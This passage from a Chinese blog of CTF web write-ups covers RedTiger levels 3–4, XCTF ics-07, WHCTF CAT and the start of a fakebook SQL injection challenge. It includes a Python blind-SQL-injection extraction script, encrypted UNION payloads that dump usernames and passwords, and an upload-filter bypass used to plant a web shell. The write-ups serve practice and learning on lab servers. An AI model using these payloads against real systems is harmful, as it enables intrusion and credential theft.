+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;level4.php?id&#x3D;1 and 1&#x3D;(select length(keyword)&#x3D;21 from level4_secret)</span><br></pre></td></tr></table></figure>
+
+<p>构造出来一个url</p>
+<p>然后看了一下大佬的wp<br>写一个简单的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">keword=<span class="string">&#x27;&#x27;</span></span><br><span class="line">char=string.printable</span><br><span class="line">url=<span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php?id=1 and 1=(select ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))=&#123;1&#125;)&#x27;</span></span><br><span class="line">cookie=&#123;<span class="string">&#x27;level4login&#x27;</span>:<span class="string">&#x27;there_is_no_bug&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char:</span><br><span class="line">        test=url.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(c))</span><br><span class="line">        r=requests.get(test,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;Query returned 1 rows.&#x27;</span>,r.text):</span><br><span class="line">            <span class="built_in">print</span> i,c</span><br><span class="line">            keword+=c</span><br><span class="line"><span class="built_in">print</span> keword</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/16/redtiger-third/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/16/redtiger-third/" class="post-title-link" itemprop="url">redtiger_third</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-16 14:09:01" itemprop="dateCreated datePublished" datetime="2021-01-16T14:09:01+08:00">2021-01-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-17 14:25:26" itemprop="dateModified" datetime="2021-01-17T14:25:26+08:00">2021-01-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="redtiger-third"><a href="#redtiger-third" class="headerlink" title="redtiger_third"></a>redtiger_third</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/17/9E5bipaHStBxIWk.png"></p>
+<p>点开一个看看<br><img src="https://i.loli.net/2021/01/17/Wsb82kXGAgnQlHN.png"></p>
+<p>根据题目的提示，感觉是报错注入<br>试了一下各种报错好像都没有成功，看了wp知道是数组的报错<br>将rul改成usr[]=。。。。。。</p>
+<p><img src="https://i.loli.net/2021/01/17/hwUVpbnRfcNezKT.png" alt="成功报错了"></p>
+<p>将文件下载下来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        srand(<span class="number">3284724</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        srand(<span class="number">3284724</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">                    <span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后抄袭了一下大佬的加密过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># order by</span></span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php?usr=Admin&#x27; order by 6</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMzMDY4MTc1MDg5 </span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php?usr=Admin&#x27; order by 7</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY4MTc1MDg5</span><br><span class="line"><span class="comment"># order by 会报错，不晓得为啥，但是union就查询正常～～</span></span><br><span class="line"><span class="comment"># union 查回显</span></span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=<span class="string">&#x27; union select 1,2,3,4,5,6,7&#x27;</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDc2MTk0MDEzMTgyMTQxMjMxMjIzMDc1MTk5MTA5MTg0MTU5MDkzMjM5MDc4MDczMjM3MDc3MTc0MDcwMDU3MTk5MjM0MjE5MDgyMjQ2MTUzMjE5</span><br><span class="line"><span class="comment"># 查用户名和密码</span></span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php?usr=&#x27; union select 1,username,3,4,5,password,7 from level3_users where username=&#x27;Admin</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDIwMjM4MDE1MTI3MTMzMTkwMTU0MDAxMjQ2MTU3MjA4MTc3MDk2MTI4MjIwMTE2MTIxMTYzMTQ5MjEzMTYwMTA4MDMyMjUyMjAzMDk3MTU2MTkwMTc1MDEzMTM5MDc4MTU1MDk2MDg1MTM0MTk3MTE5MDU5MTYzMTc4MDU2MDM3MDAzMTM2MDQ3MDY2MTA2MTE0MDQ2MjA2MTQ4MDcyMTQxMjE0MDc1MDQ0MjE1MjAzMDM3MDgyMTk4MDcyMTIzMjE1</span><br></pre></td></tr></table></figure>
+<pre><code>得到加密后的url</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDE3MjUyMDI1MTI2MTU2MTc2MTMzMDAwMjQ2MTU2MjA4MTgyMDk2MTI5MjIwMDQ5MDUyMjMwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTkwMjIwMDcxMDQwMjIw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/17/7oAaSTgc3vpZVnX.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/14/XCTF-4th-CyberEarth/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/14/XCTF-4th-CyberEarth/" class="post-title-link" itemprop="url">XCTF-4th-CyberEarth</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-14 09:58:09 / Modified: 10:11:29" itemprop="dateCreated datePublished" datetime="2021-01-14T09:58:09+08:00">2021-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/14/YnbcwaP6Z9XJWEk.png"></p>
+<p>下面有hint<br>就点开看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">       <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">       <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">       <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">       <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">       <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">       <span class="keyword">die</span>();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先看这一段代码</p>
+<blockquote>
+<p>if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== ‘1’ &amp;&amp; substr($_GET[id], -1) === ‘9’)<br> 要越过这一条<br> 构造upload<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1-9&amp;submit&amp;page&#x3D;flag.php</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p> <img src="https://i.loli.net/2021/01/14/ZQrdNGIWvi7j1E8.png" alt="显示越过成功"></p>
+<p>下面继续看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">      <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">          <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">          fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">          fclose(<span class="variable">$f</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个正则的绕过有点没看懂<br>看来大佬的wp，好像就用.直接绕过了</p>
+<p><img src="https://i.loli.net/2021/01/14/muTg1OFPhtHUjDz.png" alt="写一句话木马"><br>直接上传🐎</p>
+<p><img src="https://i.loli.net/2021/01/14/Jacej8MzhYLBiq4.png" alt="蚁剑大法好啊"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/09/XCTF-4th-WHCTF-2017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/09/XCTF-4th-WHCTF-2017/" class="post-title-link" itemprop="url">XCTF-4th-WHCTF-2017</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-09 16:26:05" itemprop="dateCreated datePublished" datetime="2021-01-09T16:26:05+08:00">2021-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-10 22:54:13" itemprop="dateModified" datetime="2021-01-10T22:54:13+08:00">2021-01-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="XCTF-4th-WHCTF-2017-web题-CAT"><a href="#XCTF-4th-WHCTF-2017-web题-CAT" class="headerlink" title="XCTF 4th-WHCTF-2017 web题 CAT"></a>XCTF 4th-WHCTF-2017 web题 CAT</h1><p>首先打开题目，要求输入域名<br>首先随便输入了一个baidu.com<br>发现没有回显<br>然后在输入127.0.0.1</p>
+<p><img src="https://i.loli.net/2021/01/03/mFVPchU8IuXagSi.png" alt="试一下本地的"><br>发现原来是ping的连接</p>
+<p><img src="https://i.loli.net/2021/01/03/8MCw1AQPGJcO9Ys.png" alt="网上查询资料"></p>
+<p>然后去看setting<br><img src="https://i.loli.net/2021/01/03/rwXI5klsEpH83j2.png"></p>
+<p>找到路径之后，直接跳转<br><img src="https://i.loli.net/2021/01/03/4671fEYIvJDp3iB.png"><br>在这个里面去找database</p>
+<p><img src="https://i.loli.net/2021/01/03/T2NpH1w9mUMoCtP.png" alt="找到database"><br>然后再去下一步，<br>去找ctf<br><img src="https://i.loli.net/2021/01/03/W4SlwVTqYDbH7JF.png" alt="查找ctf"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+<h2 id="关于php-curl的介绍"><a href="#关于php-curl的介绍" class="headerlink" title="关于php curl的介绍"></a>关于php curl的介绍</h2><p><img src="https://img.it610.com/image/info8/a24d1740e7224686a77188fbacf2139f.jpg"><br>感觉这题涉及到的知识有点太多了，几乎没接触过，看完别人的wp还是有点懵</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/" class="post-title-link" itemprop="url">网鼎杯2018</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-08 14:18:31" itemprop="dateCreated datePublished" datetime="2021-01-08T14:18:31+08:00">2021-01-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-10 22:54:09" itemprop="dateModified" datetime="2021-01-10T22:54:09+08:00">2021-01-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="网鼎杯-2018-web题-fakebook"><a href="#网鼎杯-2018-web题-fakebook" class="headerlink" title="网鼎杯 2018 web题 fakebook"></a>网鼎杯 2018 web题 fakebook</h1><p><img src="https://i.loli.net/2021/01/03/fsdrYZWDb4NTeuh.png" alt="首先看题目"><br>随便注册一个账号</p>
+<p><img src="https://i.loli.net/2021/01/03/d1c3VwsQrhOKzqD.png" alt="查看源码"><br>感觉是sql注入</p>
+<p><img src="https://i.loli.net/2021/01/03/Jo8WurMy7GUSp1x.png" alt="加个&#39;试一下报错"><br>确实是sql注入</p>
+<p><img src="https://i.loli.net/2021/01/03/b2S7483tiPqoFhC.png" alt="用orderby看一下列数"><br>有4列</p>
+<p><img src="https://i.loli.net/2021/01/03/ru9xsfOEVIn2D6G.png" alt="试一下select"></p>
+<p>发现好像没有成功，是不是把空格过滤了，换成++再试一下<br><img src="https://i.loli.net/2021/01/03/gMFxDB6suSVebom.png" alt="换成++成功了"></p>
+<p>开始sql注入的基本步骤<br><img src="https://i.loli.net/2021/01/03/w5oUpLNPJGWxtXA.png"></p>
+<p>去看一下data<br><img src="https://i.loli.net/2021/01/03/ElnyCGoxRvH29bi.png"></p>
+<p>最后得到的结果好像有点不一样<br><img src="https://i.loli.net/2021/01/03/JbLWSENzjCBl39H.png"></p>
+<p>查看robots.txt<br><img src="https://i.loli.net/2021/01/03/36vmxMgDeU1GKCI.png"></p>
+<p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> 